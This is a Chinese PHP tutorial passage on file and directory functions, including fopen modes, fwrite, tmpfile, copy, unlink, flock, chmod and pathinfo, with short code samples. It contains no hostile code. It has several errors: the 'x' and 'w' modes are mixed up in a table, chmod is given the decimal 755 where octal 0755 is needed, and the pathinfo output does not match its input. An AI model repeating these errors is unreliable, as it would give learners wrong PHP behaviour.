class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较"><a href="#2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较" class="headerlink" title="2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较"></a><font color="#3CB371" face="Comic sans MS">2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int fwrite ( resource $文件资源变量, string $写入的字符串 [, int 长度])</strong></font><br>注：fwrite的别名函数是fputs</p>
<p><font color="red"><strong>1. fopen()的w模式：</strong></font>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建。每一次写入新的数据时，都会将原来的数据清空之后才写入！<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $filename = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   $fp= fopen($filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">   $len = fwrite($fp, <span class="string">&#x27;我是一只来自北方的狼，却在南方冻成了狗&#x27;</span>);</span><br><span class="line">   fclose($fp);</span><br><span class="line">   <span class="keyword">print</span> $len .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font><br><strong>1. 不论有没有新建都会打开文件重新写入<br>2.原有的文件内容会被覆盖掉<br>3.文件不存在会创建</strong></p>
</blockquote>
<p>那我们来对比一下以下几个模式的不同：</p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="left">只能读不能使用fwrite写</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="left">可操作读、写(可使用fwrite写入)</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">只可以写功能</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="left">即可读又可以写</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="2-3-a模式和w模式、x模式和w模式的不同"><a href="#2-3-a模式和w模式、x模式和w模式的不同" class="headerlink" title="2.3 a模式和w模式、x模式和w模式的不同"></a><font color="#3CB371" face="Comic sans MS">2.3 a模式和w模式、x模式和w模式的不同</font></h4><p><font color="#FF7F00"><strong>1. a模式和w模式总结：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">总结</th>
</tr>
</thead>
<tbody><tr>
<td align="center">x</td>
<td align="left">每次写入会干掉原有文件的内容，文件不存在都会创建</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">每次写入都会向文件的尾端追加内容</td>
</tr>
</tbody></table>
<p>&emsp;<br><font color="#FF7F00"><strong>2. x模式和w模式总结：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $filename = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   $fp= fopen($filename, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">   $len = fwrite($fp,<span class="string">&#x27;读大学迷茫了，PHP中文网学PHP给你希望&#x27;</span>);</span><br><span class="line">   <span class="keyword">echo</span>  $len .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>总结：</strong><br>   1.文件存在的时候会报错<br>   2.如果把$filename 改成其他的文件名,就可以了。但是，再次刷新的时候又报错了<br>   3.x+ 是增强的x模式。读取时也可以使用。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h3 id="三-创建临时文件"><a href="#三-创建临时文件" class="headerlink" title="三. 创建临时文件"></a><font color="#FF6347" face="Comic sans MS">三. 创建临时文件</font></h3><p>使用这个函数：<font color="#00B2EE"><strong>resource tmpfile ( )</strong></font></p>
<blockquote>
<p><strong>功能：创建一个临时文件，返回资源类型。关闭文件即被删除。</strong></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //创建了一个临时文件,创建后并且打开这个文件	</span><br><span class="line">   <span class="variable">$handle</span> = tmpfile();</span><br><span class="line"></span><br><span class="line">   //向里面写入了数据</span><br><span class="line">   <span class="variable">$numbytes</span> = fwrite(<span class="variable">$handle</span>, <span class="string">&#x27;写入临时文件&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   //关闭临时文件，文件即被删除</span><br><span class="line">   fclose(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">echo</span>  <span class="string">&#x27;向临时文件中写入了&#x27;</span>.<span class="variable">$numbytes</span> . <span class="string">&#x27;个字节&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h3 id="四-移动、拷贝和删除文件"><a href="#四-移动、拷贝和删除文件" class="headerlink" title="四. 移动、拷贝和删除文件"></a><font color="#FF6347" face="Comic sans MS">四. 移动、拷贝和删除文件</font></h3><h4 id="4-1-重命名文件"><a href="#4-1-重命名文件" class="headerlink" title="4.1 重命名文件"></a><font color="#3CB371" face="Comic sans MS">4.1 重命名文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>rename(oldname,newname,context)</strong></font>;<br></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">oldname</td>
<td align="left">必需。规定要重命名的<strong>文件</strong>或**目录(文件夹)**。</td>
</tr>
<tr>
<td align="center">newname</td>
<td align="left">必需。规定文件或目录的新名称。</td>
</tr>
<tr>
<td align="center">context</td>
<td align="left">可选。规定文件句柄的环境。context 是可修改流的行为的一套选项。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//旧文件名</span></span><br><span class="line">   $filename = <span class="string">&#x27;test.php.old&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//新文件名</span></span><br><span class="line">   $filename2 = <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//复制文件</span></span><br><span class="line">   rename($filename, $filename2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="4-2-复制文件"><a href="#4-2-复制文件" class="headerlink" title="4.2 复制文件"></a><font color="#3CB371" face="Comic sans MS">4.2 复制文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>copy(源文件,目标文件)</strong></font>;<br></font> </p>
<blockquote>
<p><strong>功能：将指定路径的源文件，复制一份到目标文件的位置。如果复制到当前目录下，则必须重新改一个名字，其他目录下的话也要在目的路径下加上文件名，不管改不改名字。</strong></p>
</blockquote>
<p>copy(source,destination):</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">source</td>
<td align="left">必需。规定要复制的文件。</td>
</tr>
<tr>
<td align="center">destination</td>
<td align="left">必需。规定复制文件的目的地。</td>
</tr>
</tbody></table>
<p>(1)创建文件并复制到当前文件夹下面<font color="#FF7F00">↓↓</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//创建文件</span></span><br><span class="line">   $fi = fopen(<span class="string">&#x27;copy.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);  </span><br><span class="line">   $a=fwrite($fi,<span class="string">&quot;&quot;</span>);</span><br><span class="line">   <span class="comment">//旧文件名 </span></span><br><span class="line">   $filename = <span class="string">&#x27;copy.txt&#x27;</span>;  </span><br><span class="line">   <span class="comment">//新文件名   </span></span><br><span class="line">   $filename2 = $filename . <span class="string">&#x27;_new.txt&#x27;</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="comment">//修改名字。</span></span><br><span class="line">   copy($filename, $filename2);</span><br><span class="line">   fclose($fi);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>(2)创建文件并复制到其他文件夹下面<font color="#FF7F00">↓↓</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//创建文件</span></span><br><span class="line">   $fi = fopen(<span class="string">&#x27;copy.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);  </span><br><span class="line">   $a=fwrite($fi,<span class="string">&quot;&quot;</span>);</span><br><span class="line">   <span class="comment">//旧文件名 </span></span><br><span class="line">   $filename = <span class="string">&#x27;copy.txt&#x27;</span>;  </span><br><span class="line">   <span class="comment">//新文件名   </span></span><br><span class="line">   $filename2 = <span class="string">&quot;./01/copy.txt&quot;</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="comment">//修改名字。</span></span><br><span class="line">   copy($filename, $filename2);</span><br><span class="line">   fclose($fi);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;</p>
<h4 id="4-3-删除文件"><a href="#4-3-删除文件" class="headerlink" title="4.3 删除文件"></a><font color="#3CB371" face="Comic sans MS">4.3 删除文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>unlink(指定路径的文件)</strong></font>;<br></font> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $filename = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (unlink($filename)) &#123;</span><br><span class="line">       <span class="keyword">echo</span>  <span class="string">&quot;删除文件成功 <span class="subst">$filename</span>!\n&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;删除 <span class="subst">$filename</span> 失败!\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h3 id="五-检测文件属性函数"><a href="#五-检测文件属性函数" class="headerlink" title="五. 检测文件属性函数"></a><font color="#FF6347" face="Comic sans MS">五. 检测文件属性函数</font></h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">bool file_exists ( $指定文件名或者文件路径)</td>
<td align="left">文件是否存在</td>
</tr>
<tr>
<td align="left">bool is_readable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可读</td>
</tr>
<tr>
<td align="left">bool is_writeable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可写</td>
</tr>
<tr>
<td align="left">bool is_executable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可执行</td>
</tr>
<tr>
<td align="left">bool is_file ( $指定文件名或者文件路径)</td>
<td align="left">是否是文件</td>
</tr>
<tr>
<td align="left">bool is_dir ( $指定文件名或者文件路径)</td>
<td align="left">是否是目录</td>
</tr>
<tr>
<td align="left">void clearstatcache ( void )</td>
<td align="left">清楚文件的状态缓存</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $g=file_exists(<span class="string">&quot;install.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> $g;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&#x27;install.txt&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;已安装，请不要再次进行安装&#x27;</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="number">5462564</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：<span class="number">1</span> 已安装，请不要再次进行安装</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h3 id="六-文件常用函数和常量"><a href="#六-文件常用函数和常量" class="headerlink" title="六. 文件常用函数和常量"></a><font color="#FF6347" face="Comic sans MS">六. 文件常用函数和常量</font></h3><h4 id="6-1-目录分割符常量"><a href="#6-1-目录分割符常量" class="headerlink" title="6.1 目录分割符常量"></a><font color="#3CB371" face="Comic sans MS">6.1 目录分割符常量</font></h4><table>
<thead>
<tr>
<th align="center">平台</th>
<th align="left">分割符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">windows</td>
<td align="left">\ 或者 /</td>
</tr>
<tr>
<td align="center">类unix</td>
<td align="left">/</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>windows 的路径格式为 d:\xxx\xxx 注意：windows支持 d:/xxx/xxx</li>
<li>linux 的路径格式为 /home/xxx/xxx 注意：如果\home\xxx\xxx 在linux上是<strong>错误</strong>的</li>
<li>所以当开启转义之类的话，转义字符 \ 用一起的话 d:\xxx\xxx 是一样的。判断时候有两个 \ 有的话 再转成一个\ 再把 \ 替换成 /当路径分割，这样在linux上或者windos上的路径就能保持统一了。</li>
</ol>
</blockquote>
<p>&emsp;</p>
<h4 id="6-2-DIRECTORY-SEPARATOR常量"><a href="#6-2-DIRECTORY-SEPARATOR常量" class="headerlink" title="6.2 DIRECTORY_SEPARATOR常量"></a><font color="#3CB371" face="Comic sans MS">6.2 DIRECTORY_SEPARATOR常量</font></h4><p><font face="Comic sans MS">在 Windows 中，斜线（/）和反斜线（\）都可以用作目录分隔符，在linux上路径的分隔符是/，这就导致了一个问题，比如开发机器是windows，有一个图片上传程序，，而我们又使用了(\)作为文件分隔符，调试机器上指定的上传文件保存目录是：<br>define(‘ROOT’,dirname(__FILE__).”\upload”)，在本地调试都很正常，但是上传到linux服务器的时候会发现会出错。<br>这个问题就是出在文件的分隔符上，windows上习惯性的使用\作为文件分隔符，但是在linux上人家是不认识这个标识的，人家只认识/，于是就要引入下面这个php内置变量了：<font color="#00B2EE"><strong>DIRECTORY_SEPARATOR</strong></font>。</p>
<p>上面的写法可以改写为以下无错写法：<br>define(‘ROOT’,dirname(__FILE__).DIRECTORY_SEPARATOR.”upload”);<br>这样就可以确保不会出错了。<br></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font><br>DIRECTORY_SEPARATOR是一个<font color="#FF7F00"><strong>返回跟操作系统相关的路径分隔符</strong></font>的php内置命令，在windows上返回\，而在linux或者类unix上返回/，就是这么个区别，通常在定义包含文件路径或者上传保存目录的时候会用到。</p>
</blockquote>
<p>&emsp;</p>
<h4 id="6-3-文件指针操作函数"><a href="#6-3-文件指针操作函数" class="headerlink" title="6.3 文件指针操作函数"></a><font color="#3CB371" face="Comic sans MS">6.3 文件指针操作函数</font></h4><p><font color="#00B2EE"><strong>rewind ( resource handle)</strong></font></p>
<blockquote>
<p><strong>功能：指针回到开始处</strong></p>
</blockquote>
<p><font color="#00B2EE"><strong>fseek ( resource handle, int offset [, int from_where])</strong></font></p>
<blockquote>
<p><strong>功能：文件指针向后移动指定字符</strong></p>
</blockquote>
<p><strong>注意：</strong>我们在之前的读取当中我们发现fread读取指定长度的数据。读取指定长度的内容，下次再读取的时候<strong>从原位置开始再接着向后读取</strong>。</p>
<p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_fseek.asp">PHP fseek() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要在其中定位的文件。</td>
</tr>
<tr>
<td align="center">offset</td>
<td align="left">必需。<strong>规定新的位置</strong>（从文件头开始以字节数度量）。</td>
</tr>
<tr>
<td align="center">whence</td>
<td align="left">可选。<br>可能的值：<br>SEEK_SET - 设定位置等于 offset 字节。默认。<br>SEEK_CUR - 设定位置为当前位置加上 offset。<br>SEEK_END - 设定位置为文件末尾加上 offset （要移动到文件尾之前的位置，offset 必须是一个<br>负值）。</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="6-4-filesize-检测文件的大小"><a href="#6-4-filesize-检测文件的大小" class="headerlink" title="6.4 filesize 检测文件的大小"></a><font color="#3CB371" face="Comic sans MS">6.4 filesize 检测文件的大小</font></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = <span class="string">&#x27;demo.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename . <span class="string">&#x27;文件大小为: &#x27;</span> . filesize($filename) . <span class="string">&#x27; bytes&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>还有一些其他操作文件的函数，读取文件：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">把整个文件读入一个数组中</td>
</tr>
<tr>
<td align="center">fgets</td>
<td align="left">从文件指针中读取一行,读到最后返回false</td>
</tr>
<tr>
<td align="center">fgetc</td>
<td align="left">从文件指针中读取一个字符，读到最后返回false</td>
</tr>
<tr>
<td align="center">ftruncate</td>
<td align="left">将文件截断到给定的长度</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="6-5-文件的时间函数"><a href="#6-5-文件的时间函数" class="headerlink" title="6.5 文件的时间函数"></a><font color="#3CB371" face="Comic sans MS">6.5 文件的时间函数</font></h4><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">filectime</td>
<td align="left">文件创建时间</td>
</tr>
<tr>
<td align="center">filemtime</td>
<td align="left">文件修改时间</td>
</tr>
<tr>
<td align="center">fileatime</td>
<td align="left">文件上次访问时间</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = <span class="string">&#x27;demo.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的上次访问时间是:&#x27;</span>  . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, fileatime($filename));</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的创建时间是: &#x27;</span> . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, filectime($filename));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的修改时间是: &#x27;</span> . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, filemtime($filename));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">```			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line"><span class="comment">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;七. 文件锁处理机制&lt;/font&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;**文件锁的用途：**</span><br><span class="line">若一个人在写入一个文件，另外一个人同时也打个了这个文件进行写入文件。</span><br><span class="line">这情况下，如果遇到一定的碰撞概率的话，不知道到底谁的操作为准。</span><br><span class="line">因此，这个时候我们引入锁机制。</span><br><span class="line">若用户A在写入或者读取这个文件的时候，将文件加上共享所。我可以读，其他人也可以读。</span><br><span class="line">但是，我如果这与的时候。我使用独占锁。这个文件归我了，你们都别动，除非我将文件锁进行释放。</span><br><span class="line"></span><br><span class="line">&lt;font color=<span class="string">&quot;#FF7F00&quot;</span>&gt;**注意：不论加上了文件锁后要注意释放。**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">**<span class="keyword">bool</span>** &lt;font color=<span class="string">&quot;#00B2EE&quot;</span>&gt;**flock(file,lock,block)**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">参数	|描述|</span><br><span class="line">:-:|:-|	</span><br><span class="line">file	|必需。规定要锁定或释放的已打开的文件。</span><br><span class="line">lock	|必需。规定要使用哪种锁定类型。&lt;br&gt;lock 参数可以是以下值之一：&lt;br&gt;要取得共享锁定（读取的程序），将 lock 设为 LOCK_SH（PHP <span class="number">4.0</span><span class="number">.1</span> 以前的版本设置为 <span class="number">1</span>）&lt;br&gt;要取得独占锁定（写入的程序），将 lock 设为 LOCK_EX（PHP <span class="number">4.0</span><span class="number">.1</span> 以前的版本中设置为 <span class="number">2</span>）&lt;br&gt;要释放锁定（无论共享或独占），将 lock 设为 LOCK_UN（PHP <span class="number">4.0</span><span class="number">.1</span> 以前的版本中设置为 <span class="number">3</span>）&lt;br&gt;如果不希望 flock() 在锁定时堵塞，则给 lock 加上 LOCK_NB(PHP <span class="number">4.0</span><span class="number">.1</span> 以前的版本中设置为 <span class="number">4</span>)</span><br><span class="line">block	|可选。若设置为 <span class="number">1</span> 或 <span class="literal">true</span>，则当进行锁定时阻挡其他进程。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">&quot;demo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行排它型锁定</span></span><br><span class="line"><span class="keyword">if</span> (flock($fp, LOCK_EX)) &#123; </span><br><span class="line"></span><br><span class="line">   fwrite($fp, <span class="string">&quot;文件这个时候被我独占了哟\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放锁定</span></span><br><span class="line">   flock($fp, LOCK_UN);    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;锁失败，可能有人在操作，这个时候不能将文件上锁&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明：</strong></p>
</blockquote>
<ol>
<li>上例中我为了写入文件，把文件加上了独占锁。</li>
<li>如果我操作完成，写入完成后，解除掉了独占锁。</li>
</ol>
<p>&emsp;<br>&emsp;</p>
<h3 id="八-目录-文件夹-处理函数"><a href="#八-目录-文件夹-处理函数" class="headerlink" title="八. 目录(文件夹)处理函数"></a><font color="#FF6347" face="Comic sans MS">八. 目录(文件夹)处理函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>处理文件夹的基本思想如下：</strong></font></p>
</blockquote>
<ol>
<li>读取某个路径的时候判断是否是文件夹</li>
<li>是文件夹的话，打开指定文件夹，返回文件目录的资源变量</li>
<li>使用readdir读取一次目录中的文件，目录指针向后偏移一次</li>
<li>使用readdir读取到最后，没有可读的文件返回false</li>
<li>关闭文件目录</li>
</ol>
<p>&emsp;<br>常用函数：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">opendir()</td>
<td align="left">打开文件夹，返回操作资源 &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_opendir.asp">PHP opendir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">readdir()</td>
<td align="left">读取文件夹资源,返回目录中下一个文件的文件名。 &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_readdir.asp">PHP readdir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">is_dir()</td>
<td align="left">判断是否是文件夹  &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_is_dir.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">closedir()</td>
<td align="left">关闭文件夹操作资源  &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_closedir.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">filetype()</td>
<td align="left">显示是文件夹还是文件，文件显示file，文件夹显示dir <br>可能的类型：（fifo、char、dir、block、link、file、unknown）&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_filetype.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
</tbody></table>
<p>&emsp;<br>&emsp;</p>
<h3 id="九-文件权限设置"><a href="#九-文件权限设置" class="headerlink" title="九. 文件权限设置"></a><font color="#FF6347" face="Comic sans MS">九. 文件权限设置</font></h3><ol>
<li><p><strong>文件权限设置的函数</strong>在系统管理级别的软件中很常用。<br>例如：某个文件不准许guest组（来宾用户）查看。</p>
</li>
<li><p>在企业管理中，某些用户或者某些用户文件只准读取不准修改。这都是非常常用的功能。</p>
</li>
<li><p>注：windows下面有些功能无法实现。</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">chmod</td>
<td align="left">修改读取模式</td>
</tr>
<tr>
<td align="center">chgrp</td>
<td align="left">修改用户组</td>
</tr>
<tr>
<td align="center">chown</td>
<td align="left">修改权限</td>
</tr>
</tbody></table>
<blockquote>
<p>上面的函数用法与linux的权限操作的用法一样。</p>
</blockquote>
<p>&emsp;<br>chmod 主要是修改文件的的权限</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//修改linux  系统/var/wwwroot/某文件权限为755</span></span><br><span class="line">chmod(<span class="string">&quot;/var/wwwroot/index.html&quot;</span>, <span class="number">755</span>);  </span><br><span class="line">chmod(<span class="string">&quot;/var/wwwroot/index.html&quot;</span>, <span class="string">&quot;u+rwx,go+rx&quot;</span>); </span><br><span class="line">chmod(<span class="string">&quot;/somedir/somefile&quot;</span>, <span class="number">0755</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h3 id="十-文件路径函数"><a href="#十-文件路径函数" class="headerlink" title="十. 文件路径函数"></a><font color="#FF6347" face="Comic sans MS">十. 文件路径函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>我们经常会遇到处理文件路径的情况。</strong></font></p>
</blockquote>
<ol>
<li>文件后缀需要取出来</li>
<li>路径需要取出名字不取目录</li>
<li>只需要取出路径名中的目录路径</li>
<li>或者把网址中的各个部份进行解析取得独立值</li>
<li>甚至是自己组成一个url出来<br>……</li>
</ol>
<p>&emsp;<br>常用路径处理函数：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pathinfo()</td>
<td align="left">返回文件的各个组成部份</td>
</tr>
<tr>
<td align="center">basename()</td>
<td align="left">返回文件名</td>
</tr>
<tr>
<td align="center">dirname()</td>
<td align="left">文件目录部份</td>
</tr>
<tr>
<td align="center">parse_url()</td>
<td align="left">网址拆解成各部份</td>
</tr>
<tr>
<td align="center">http_build_query()</td>
<td align="left">生成url 中的query字符串</td>
</tr>
<tr>
<td align="center">http_build_url()</td>
<td align="left">生成一个url</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="10-1-pathinfo-函数"><a href="#10-1-pathinfo-函数" class="headerlink" title="10.1 pathinfo()函数"></a><font color="#3CB371" face="Comic sans MS">10.1 pathinfo()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：以关联数组的形式返回文件路径的信息</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>pathinfo(path,options)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_pathinfo.asp">PHP pathinfo() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">process_sections</td>
<td align="left">可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$path_parts = pathinfo(<span class="string">&#x27;d:/www/index.inc.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件目录名：&#x27;</span>.$path_parts[<span class="string">&#x27;dirname&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件全名：&#x27;</span>.$path_parts[<span class="string">&#x27;basename&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件扩展名：&#x27;</span>.$path_parts[<span class="string">&#x27;extension&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不包含扩展的文件名：&#x27;</span>.$path_parts[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">文件目录名：d:/www</span><br><span class="line">文件全名：lib.inc.php</span><br><span 